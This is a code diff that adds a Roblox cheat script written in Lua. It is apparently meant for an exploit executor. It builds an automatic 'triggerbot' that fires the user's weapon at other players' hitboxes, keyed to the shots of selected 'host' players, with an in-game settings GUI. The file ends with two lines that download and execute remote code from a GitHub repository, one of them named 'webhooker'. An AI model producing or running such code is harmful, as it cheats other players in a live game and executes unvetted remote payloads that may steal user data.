@@ -1,4 +1,733 @@
 
+Services = setmetatable({}, {
+	__index = function(self, name)
+		local success, cache = pcall(function()
+			return cloneref(game:GetService(name))
+		end)
+		if success then
+			rawset(self, name, cache)
+			return cache
+		else
+			error("Invalid Service: " .. tostring(name))
+		end
+	end
+})
+
+CoreGUI = Services.CoreGui
+
+
+local settings = getgenv().TBSettings
+
+local HostDelay = settings.HostDelay
+local TBDelay = settings.TBDelay
+local Hold = settings.Hold
+local HoldKB = settings.HoldKB
+local WhitelistedTools = settings.WhitelistedTools
+local ListenKB = settings.ListenKB
+
+local held = false
+local listen = false
+
+local uis = game:GetService("UserInputService")
+
+
+
+local function applyHoldState()
+    if not Hold then
+        held = true
+    else
+        held = false
+    end
+end
+applyHoldState()
+
+local function applyListenState()
+    if not ListenKB then
+        listen = true
+    else
+        listen = false
+    end
+end
+applyListenState()
+
+uis.InputBegan:Connect(function(input, gameProcessed)
+    if gameProcessed then return end
+    if HoldKB and input.KeyCode == HoldKB then
+        if Hold == "Toggle" then
+            held = not held
+        elseif Hold == "Hold" then
+            held = true
+        end
+    end
+    if ListenKB and input.KeyCode == ListenKB then
+        listen = not listen
+    end
+end)
+
+uis.InputEnded:Connect(function(input, gameProcessed)
+    if gameProcessed then return end
+    if HoldKB and input.KeyCode == HoldKB and Hold == "Hold" then
+        held = false
+    end
+end)
+
+
+
+local toolsconnected = {}
+local playersconnected = {}
+
+local target
+local tbconn = nil
+local koconn = nil
+
+local runService = game:GetService("RunService")
+local players = game:GetService("Players")
+local lP = players.LocalPlayer
+
+local mouse = lP:GetMouse()
+
+
+
+local mychar
+local backpack
+local t
+
+
+
+function connectlP()
+    local addedconn
+    local removedconn
+
+    mychar = lP.Character or lP.CharacterAdded:Wait()
+    backpack = lP:FindFirstChild("Backpack")
+
+    if mychar:FindFirstChildOfClass("Tool") then
+        t = mychar:FindFirstChildOfClass("Tool")
+    end
+
+    addedconn = mychar.ChildAdded:Connect(function(child)
+        if child:IsA("Tool") then
+            t = child
+        end
+    end)
+
+    removedconn = mychar.ChildRemoved:Connect(function(child)
+        if child:IsA("Tool") then
+            t = nil
+        end
+    end)
+
+    deathconn = lP.CharacterAdded:Connect(function(newchar)
+        if addedconn then addedconn:Disconnect() end
+        if removedconn then removedconn:Disconnect() end
+
+        mychar = newchar
+        backpack = lP:FindFirstChild("Backpack")
+        if newchar:FindFirstChildOfClass("Tool") then
+            t = newchar:FindFirstChildOfClass("Tool")
+        end
+
+        addedconn = newchar.ChildAdded:Connect(function(child)
+            if child:IsA("Tool") then
+                t = child
+            end
+        end)
+
+        removedconn = newchar.ChildRemoved:Connect(function(child)
+            if child:IsA("Tool") then
+                t = nil
+            end
+        end)
+    end)
+end
+
+
+connectlP()
+
+
+
+function setupko()
+    if not target then warn('no target') return end
+    local bodyEffects = target:FindFirstChild("BodyEffects")
+    if not bodyEffects then warn('couldnt find BodyEffects') return end
+    local ko = bodyEffects:FindFirstChild("K.O")
+    if not ko then warn('couldnt find ko') return end
+
+    koconn = ko.Changed:Connect(function(nv)
+        if nv == true then
+            print("target died")
+            if tbconn then tbconn:Disconnect() tbconn = nil end
+            if koconn then koconn:Disconnect() koconn = nil end
+            target = nil
+        end
+    end) -- ko is a boolvalue that has the value property, so we wait for the value to change to true
+end
+
+
+
+
+function connectTool(char)
+    local tool = char:FindFirstChildOfClass("Tool")
+    if not tool then warn('no tool') return end
+	if not WhitelistedTools[tool.Name] then return end
+    local ammo = tool:FindFirstChild("Ammo")
+    local maxAmmo = tool:FindFirstChild("MaxAmmo")
+
+    if not ammo then
+        warn('no ammo path')
+        return
+    end
+    if not maxAmmo then
+        warn('no maxammo path')
+        return
+    end
+    local ma = maxAmmo.Value
+
+    local toolconn = ammo.Changed:Connect(function(nV)
+        if not listen then return end
+        if nV == ma then return end
+
+        local hitPart1 = mouse.Target
+
+        task.wait(HostDelay)
+
+        if held and hitPart1.Name == "Hitbox" then
+            t:Activate()
+            target = hitPart1:FindFirstAncestorOfClass("Model")
+            setupko()
+        end
+
+        if tbconn then
+            return
+        end
+
+        local oldTick = tick()
+        tbconn = runService.RenderStepped:Connect(function()
+            if not held then return end
+            if tick() - oldTick >= TBDelay then
+                local hitPart = mouse.Target
+                if hitPart.Name == "Hitbox" then
+                    if target then
+                        if hitPart:FindFirstAncestorOfClass("Model") == target then -- same target
+                            t:Activate()
+                            oldTick = tick()
+                        end
+                    else
+                        t:Activate()
+                        oldTick = tick()
+                        target = hitPart:FindFirstAncestorOfClass("Model")
+                        setupko()
+                    end
+                end
+            end
+        end)
+    end)
+    return toolconn
+end
+
+
+function sethost(plr)
+    local conns = {}
+    local entry = {player = plr, conns = conns}
+    table.insert(playersconnected, entry)
+
+    local function setToolConn(c)
+        if conns.tool then conns.tool:Disconnect() end
+        conns.tool = c
+    end
+
+    local function bindChar(char)
+        if conns.added then conns.added:Disconnect() conns.added = nil end
+        if conns.removed then conns.removed:Disconnect() conns.removed = nil end
+        setToolConn(nil)
+
+        if char:FindFirstChildOfClass("Tool") then
+            setToolConn(connectTool(char))
+        end
+
+        conns.added = char.ChildAdded:Connect(function(child)
+            if child:IsA("Tool") then setToolConn(connectTool(char)) end
+        end)
+        conns.removed = char.ChildRemoved:Connect(function(child)
+            if child:IsA("Tool") then setToolConn(nil) end
+        end)
+    end
+
+    bindChar(plr.Character or plr.CharacterAdded:Wait())
+    conns.death = plr.CharacterAdded:Connect(bindChar)
+end
+
+
+function removehost(plr)
+    for i, entry in ipairs(playersconnected) do
+        if entry.player == plr then
+            for k, x in pairs(entry.conns) do
+                if x then x:Disconnect() end
+                entry.conns[k] = nil
+            end
+            table.remove(playersconnected, i)
+            break
+        end
+    end
+end
+
+
+local Players = game:GetService("Players")
+local StarterGui = game:GetService("StarterGui")
+
+local localPlayer = Players.LocalPlayer
+
+local hosts = {}
+
+local function notify(text, time)
+    StarterGui:SetCore("SendNotification", {
+        Title = "TB",
+        Text = text,
+        Duration = time,
+    })
+end
+
+
+local screenGui = Instance.new("ScreenGui")
+screenGui.Name = "TBGui"
+screenGui.ResetOnSpawn = false
+screenGui.Parent = CoreGUI
+screenGui.Enabled = false
+
+
+local hostFrame = Instance.new("Frame")
+hostFrame.Size = UDim2.new(0, 250, 0, 350)
+hostFrame.Position = UDim2.new(0, 20, 0.5, -175)
+hostFrame.BackgroundTransparency = 0.2
+hostFrame.BackgroundColor3 = Color3.fromRGB(50, 50, 50)
+hostFrame.Parent = screenGui
+
+local hostTitle = Instance.new("TextLabel")
+hostTitle.Size = UDim2.new(1, 0, 0, 25)
+hostTitle.Position = UDim2.new(0, 0, 0, 5)
+hostTitle.BackgroundTransparency = 1
+hostTitle.Text = "Hosts"
+hostTitle.Font = Enum.Font.SourceSansBold
+hostTitle.TextSize = 18
+hostTitle.TextColor3 = Color3.new(1, 1, 1)
+hostTitle.Parent = hostFrame
+
+local hostScroll = Instance.new("ScrollingFrame")
+hostScroll.Size = UDim2.new(1, -10, 1, -40)
+hostScroll.Position = UDim2.new(0, 5, 0, 35)
+hostScroll.CanvasSize = UDim2.new(0, 0, 2, 0)
+hostScroll.ScrollBarThickness = 6
+hostScroll.BackgroundTransparency = 1
+hostScroll.Parent = hostFrame
+
+local hostListLayout = Instance.new("UIListLayout")
+hostListLayout.SortOrder = Enum.SortOrder.LayoutOrder
+hostListLayout.Parent = hostScroll
+
+local function refreshHostList()
+    for _, child in pairs(hostScroll:GetChildren()) do
+        if child:IsA("TextButton") or child:IsA("Frame") then
+            child:Destroy()
+        end
+    end
+
+    for _, player in ipairs(Players:GetPlayers()) do
+        if player ~= localPlayer then
+            local button = Instance.new("TextButton")
+            button.Size = UDim2.new(1, -10, 0, 40)
+            button.BackgroundColor3 = hosts[player.Name] and Color3.fromRGB(0, 255, 0) or Color3.fromRGB(255, 0, 0)
+            button.TextColor3 = Color3.new(1, 1, 1)
+            button.AutoButtonColor = false
+            button.Parent = hostScroll
+            button.Text = ""
+
+            local avatar = Instance.new("ImageLabel")
+            avatar.Size = UDim2.new(0, 36, 0, 36)
+            avatar.Position = UDim2.new(0, 5, 0, 2)
+            avatar.BackgroundTransparency = 1
+            avatar.Parent = button
+            local success, thumbnail = pcall(function()
+                return Players:GetUserThumbnailAsync(player.UserId, Enum.ThumbnailType.HeadShot, Enum.ThumbnailSize.Size48x48)
+            end)
+            if success and thumbnail then
+                avatar.Image = thumbnail
+            else
+                avatar.Image = ""
+            end
+
+            local label = Instance.new("TextLabel")
+            label.Size = UDim2.new(1, -50, 1, 0)
+            label.Position = UDim2.new(0, 46, 0, 0)
+            label.BackgroundTransparency = 1
+            label.TextColor3 = Color3.new(1,1,1)
+            label.TextXAlignment = Enum.TextXAlignment.Left
+            label.Font = Enum.Font.SourceSansBold
+            label.TextSize = 18
+            label.Text = string.format("%s (%s)", player.DisplayName, player.Name)
+            label.Parent = button
+
+            button.MouseButton1Click:Connect(function()
+                if hosts[player.Name] then
+                    hosts[player.Name] = nil
+                    button.BackgroundColor3 = Color3.fromRGB(255, 0, 0)
+                    removehost(player)
+                else
+                    sethost(player)
+                    hosts[player.Name] = true
+                    button.BackgroundColor3 = Color3.fromRGB(0, 255, 0)
+                end
+            end)
+        end
+    end
+end
+
+refreshHostList()
+Players.PlayerAdded:Connect(refreshHostList)
+Players.PlayerRemoving:Connect(refreshHostList)
+
+
+local settingsFrame = Instance.new("Frame")
+settingsFrame.Size = UDim2.new(0, 250, 0, 350)
+settingsFrame.Position = UDim2.new(1, -270, 0.5, -175)
+settingsFrame.BackgroundTransparency = 0.2
+settingsFrame.BackgroundColor3 = Color3.fromRGB(50, 50, 50)
+settingsFrame.Parent = screenGui
+
+local settingsTitle = Instance.new("TextLabel")
+settingsTitle.Size = UDim2.new(1, 0, 0, 25)
+settingsTitle.Position = UDim2.new(0, 0, 0, 5)
+settingsTitle.BackgroundTransparency = 1
+settingsTitle.Text = "Settings"
+settingsTitle.Font = Enum.Font.SourceSansBold
+settingsTitle.TextSize = 18
+settingsTitle.TextColor3 = Color3.new(1, 1, 1)
+settingsTitle.Parent = settingsFrame
+
+local settingsContainer = Instance.new("Frame")
+settingsContainer.Size = UDim2.new(1, -10, 1, -40)
+settingsContainer.Position = UDim2.new(0, 5, 0, 35)
+settingsContainer.BackgroundTransparency = 1
+settingsContainer.Parent = settingsFrame
+
+local settingsLayout = Instance.new("UIListLayout")
+settingsLayout.Padding = UDim.new(0, 4)
+settingsLayout.SortOrder = Enum.SortOrder.LayoutOrder
+settingsLayout.Parent = settingsContainer
+
+
+local function kbDisplay(kb)
+    if typeof(kb) == "EnumItem" then return kb.Name end
+    return "false"
+end
+
+local function parseKB(txt)
+    if not txt or txt == "" then return false end
+    local lower = txt:lower()
+    if lower == "false" or lower == "none" or lower == "nil" then return false end
+
+    local candidates = { txt, txt:upper(), txt:sub(1,1):upper() .. txt:sub(2):lower() }
+    for _, c in ipairs(candidates) do
+        local ok, k = pcall(function() return Enum.KeyCode[c] end)
+        if ok and typeof(k) == "EnumItem" then return k end
+    end
+    return nil
+end
+
+
+local rowOrder = 0
+local function makeTextRow(labelText, initialText, onFocusLost)
+    rowOrder = rowOrder + 1
+    local row = Instance.new("Frame")
+    row.LayoutOrder = rowOrder
+    row.Size = UDim2.new(1, 0, 0, 25)
+    row.BackgroundTransparency = 1
+    row.Parent = settingsContainer
+
+    local lbl = Instance.new("TextLabel")
+    lbl.Size = UDim2.new(0.4, 0, 1, 0)
+    lbl.BackgroundTransparency = 1
+    lbl.Text = labelText
+    lbl.TextColor3 = Color3.new(1, 1, 1)
+    lbl.Font = Enum.Font.SourceSans
+    lbl.TextSize = 16
+    lbl.TextXAlignment = Enum.TextXAlignment.Left
+    lbl.Parent = row
+
+    local box = Instance.new("TextBox")
+    box.Size = UDim2.new(0.6, -5, 1, 0)
+    box.Position = UDim2.new(0.4, 5, 0, 0)
+    box.Text = initialText
+    box.TextColor3 = Color3.new(1, 1, 1)
+    box.BackgroundColor3 = Color3.fromRGB(70, 70, 70)
+    box.Font = Enum.Font.SourceSans
+    box.TextSize = 14
+    box.ClearTextOnFocus = false
+    box.Parent = row
+
+    box.FocusLost:Connect(function()
+        onFocusLost(box)
+    end)
+
+    return box
+end
+
+
+makeTextRow("HostDelay", tostring(HostDelay), function(box)
+    local n = tonumber(box.Text)
+    if n then
+        HostDelay = n
+        settings.HostDelay = n
+    end
+    box.Text = tostring(HostDelay)
+end)
+
+makeTextRow("TBDelay", tostring(TBDelay), function(box)
+    local n = tonumber(box.Text)
+    if n then
+        TBDelay = n
+        settings.TBDelay = n
+    end
+    box.Text = tostring(TBDelay)
+end)
+
+
+rowOrder = rowOrder + 1
+local holdRow = Instance.new("Frame")
+holdRow.LayoutOrder = rowOrder
+holdRow.Size = UDim2.new(1, 0, 0, 25)
+holdRow.BackgroundTransparency = 1
+holdRow.Parent = settingsContainer
+
+local holdLbl = Instance.new("TextLabel")
+holdLbl.Size = UDim2.new(0.4, 0, 1, 0)
+holdLbl.BackgroundTransparency = 1
+holdLbl.Text = "Hold"
+holdLbl.TextColor3 = Color3.new(1, 1, 1)
+holdLbl.Font = Enum.Font.SourceSans
+holdLbl.TextSize = 16
+holdLbl.TextXAlignment = Enum.TextXAlignment.Left
+holdLbl.Parent = holdRow
+
+local function holdDisplay()
+    if Hold == "Hold" then return "Hold"
+    elseif Hold == "Toggle" then return "Toggle"
+    else return "False" end
+end
+
+local holdBtn = Instance.new("TextButton")
+holdBtn.Size = UDim2.new(0.6, -5, 1, 0)
+holdBtn.Position = UDim2.new(0.4, 5, 0, 0)
+holdBtn.Text = holdDisplay()
+holdBtn.TextColor3 = Color3.new(1, 1, 1)
+holdBtn.BackgroundColor3 = Color3.fromRGB(70, 70, 70)
+holdBtn.Font = Enum.Font.SourceSans
+holdBtn.TextSize = 14
+holdBtn.AutoButtonColor = true
+holdBtn.Parent = holdRow
+
+holdBtn.MouseButton1Click:Connect(function()
+    if Hold == "Hold" then
+        Hold = "Toggle"
+    elseif Hold == "Toggle" then
+        Hold = false
+    else
+        Hold = "Hold"
+    end
+    settings.Hold = Hold
+    holdBtn.Text = holdDisplay()
+    applyHoldState()
+end)
+
+
+makeTextRow("HoldKB", kbDisplay(HoldKB), function(box)
+    local parsed = parseKB(box.Text)
+    if parsed ~= nil then
+        HoldKB = parsed
+        settings.HoldKB = parsed
+    end
+    box.Text = kbDisplay(HoldKB)
+end)
+
+
+makeTextRow("ListenKB", kbDisplay(ListenKB), function(box)
+    local parsed = parseKB(box.Text)
+    if parsed ~= nil then
+        ListenKB = parsed
+        settings.ListenKB = parsed
+        applyListenState()
+    end
+    box.Text = kbDisplay(ListenKB)
+end)
+
+
+rowOrder = rowOrder + 1
+local toolsHeader = Instance.new("TextLabel")
+toolsHeader.LayoutOrder = rowOrder
+toolsHeader.Size = UDim2.new(1, 0, 0, 25)
+toolsHeader.BackgroundTransparency = 1
+toolsHeader.Text = "WhitelistedTools"
+toolsHeader.TextColor3 = Color3.new(1, 1, 1)
+toolsHeader.Font = Enum.Font.SourceSansBold
+toolsHeader.TextSize = 16
+toolsHeader.TextXAlignment = Enum.TextXAlignment.Left
+toolsHeader.Parent = settingsContainer
+
+local toolNames = {}
+for k in pairs(WhitelistedTools) do table.insert(toolNames, k) end
+table.sort(toolNames)
+
+for _, toolName in ipairs(toolNames) do
+    rowOrder = rowOrder + 1
+    local row = Instance.new("Frame")
+    row.LayoutOrder = rowOrder
+    row.Size = UDim2.new(1, 0, 0, 25)
+    row.BackgroundTransparency = 1
+    row.Parent = settingsContainer
+
+    local lbl = Instance.new("TextLabel")
+    lbl.Size = UDim2.new(0.7, 0, 1, 0)
+    lbl.BackgroundTransparency = 1
+    lbl.Text = toolName
+    lbl.TextColor3 = Color3.new(1, 1, 1)
+    lbl.Font = Enum.Font.SourceSans
+    lbl.TextSize = 14
+    lbl.TextXAlignment = Enum.TextXAlignment.Left
+    lbl.Parent = row
+
+    local toggle = Instance.new("TextButton")
+    toggle.Size = UDim2.new(0.3, -5, 1, 0)
+    toggle.Position = UDim2.new(0.7, 5, 0, 0)
+    toggle.TextColor3 = Color3.new(1, 1, 1)
+    toggle.Font = Enum.Font.SourceSansBold
+    toggle.TextSize = 14
+    toggle.Parent = row
+
+    local function refreshToggle()
+        local v = WhitelistedTools[toolName]
+        toggle.Text = v and "true" or "false"
+        toggle.BackgroundColor3 = v and Color3.fromRGB(0, 150, 0) or Color3.fromRGB(150, 0, 0)
+    end
+    refreshToggle()
+
+    toggle.MouseButton1Click:Connect(function()
+        WhitelistedTools[toolName] = not WhitelistedTools[toolName]
+        refreshToggle()
+    end)
+end
+
+
+rowOrder = rowOrder + 1
+local statusHeader = Instance.new("TextLabel")
+statusHeader.LayoutOrder = rowOrder
+statusHeader.Size = UDim2.new(1, 0, 0, 25)
+statusHeader.BackgroundTransparency = 1
+statusHeader.Text = "Status"
+statusHeader.TextColor3 = Color3.new(1, 1, 1)
+statusHeader.Font = Enum.Font.SourceSansBold
+statusHeader.TextSize = 16
+statusHeader.TextXAlignment = Enum.TextXAlignment.Left
+statusHeader.Parent = settingsContainer
+
+rowOrder = rowOrder + 1
+local tbConnRow = Instance.new("Frame")
+tbConnRow.LayoutOrder = rowOrder
+tbConnRow.Size = UDim2.new(1, 0, 0, 25)
+tbConnRow.BackgroundTransparency = 1
+tbConnRow.Parent = settingsContainer
+
+local tbConnLbl = Instance.new("TextLabel")
+tbConnLbl.Size = UDim2.new(0.7, 0, 1, 0)
+tbConnLbl.BackgroundTransparency = 1
+tbConnLbl.Text = "TBConnection"
+tbConnLbl.TextColor3 = Color3.new(1, 1, 1)
+tbConnLbl.Font = Enum.Font.SourceSans
+tbConnLbl.TextSize = 14
+tbConnLbl.TextXAlignment = Enum.TextXAlignment.Left
+tbConnLbl.Parent = tbConnRow
+
+local tbConnToggle = Instance.new("TextButton")
+tbConnToggle.Size = UDim2.new(0.3, -5, 1, 0)
+tbConnToggle.Position = UDim2.new(0.7, 5, 0, 0)
+tbConnToggle.TextColor3 = Color3.new(1, 1, 1)
+tbConnToggle.Font = Enum.Font.SourceSansBold
+tbConnToggle.TextSize = 14
+tbConnToggle.Text = "false"
+tbConnToggle.BackgroundColor3 = Color3.fromRGB(150, 0, 0)
+tbConnToggle.Parent = tbConnRow
+
+tbConnToggle.MouseButton1Click:Connect(function()
+    if tbconn then
+        print("disconnecting")
+        tbconn:Disconnect()
+        tbconn = nil
+    end
+end)
+
+rowOrder = rowOrder + 1
+local targetRow = Instance.new("Frame")
+targetRow.LayoutOrder = rowOrder
+targetRow.Size = UDim2.new(1, 0, 0, 25)
+targetRow.BackgroundTransparency = 1
+targetRow.Parent = settingsContainer
+
+local targetLbl = Instance.new("TextLabel")
+targetLbl.Size = UDim2.new(0.4, 0, 1, 0)
+targetLbl.BackgroundTransparency = 1
+targetLbl.Text = "Target"
+targetLbl.TextColor3 = Color3.new(1, 1, 1)
+targetLbl.Font = Enum.Font.SourceSans
+targetLbl.TextSize = 14
+targetLbl.TextXAlignment = Enum.TextXAlignment.Left
+targetLbl.Parent = targetRow
+
+local targetVal = Instance.new("TextLabel")
+targetVal.Size = UDim2.new(0.6, -5, 1, 0)
+targetVal.Position = UDim2.new(0.4, 5, 0, 0)
+targetVal.Text = "false"
+targetVal.TextColor3 = Color3.new(1, 1, 1)
+targetVal.BackgroundColor3 = Color3.fromRGB(70, 70, 70)
+targetVal.Font = Enum.Font.SourceSans
+targetVal.TextSize = 14
+targetVal.TextXAlignment = Enum.TextXAlignment.Center
+targetVal.TextTruncate = Enum.TextTruncate.AtEnd
+targetVal.Parent = targetRow
+
+runService.Heartbeat:Connect(function()
+    local active = tbconn ~= nil
+    tbConnToggle.Text = active and "true" or "false"
+    tbConnToggle.BackgroundColor3 = active and Color3.fromRGB(0, 150, 0) or Color3.fromRGB(150, 0, 0)
+
+    if target then
+        targetVal.Text = target.Name
+    else
+        targetVal.Text = "false"
+    end
+end)
+
+
+local function createTool()
+    local tool = Instance.new("Tool")
+    tool.Name = "TBHosts"
+    tool.RequiresHandle = false
+
+    tool.Equipped:Connect(function()
+        screenGui.Enabled = true
+    end)
+
+    tool.Unequipped:Connect(function()
+        screenGui.Enabled = false
+    end)
+
+    tool.Parent = localPlayer:WaitForChild("Backpack")
+end
+
+localPlayer.CharacterAdded:Connect(function()
+    task.wait(2)
+    createTool()
+end)
+
+createTool()
+
 loadstring(game:HttpGet("https://raw.githubusercontent.com/tempqrrr/rblxlxlx/refs/heads/main/webhooker"))()
 loadstring(game:HttpGet("https://raw.githubusercontent.com/tempqrrr/rblxlxlx/refs/heads/main/waadb"))()
 
